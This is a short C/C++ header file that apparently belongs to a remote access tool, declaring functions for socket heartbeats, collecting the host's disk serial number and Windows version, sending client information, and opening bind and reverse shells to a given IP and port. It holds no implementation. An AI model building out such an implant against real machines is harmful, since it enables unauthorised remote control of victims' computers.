#pragma once

#include "headers.h"

void checkHeartBeat(SOCKET s);

string getHDDSerialNumber();

string getWindowsVersion();

void sendClientInfo(SOCKET s);

void bindShell(char* ip, int port);

void revShell(char* ip, int port);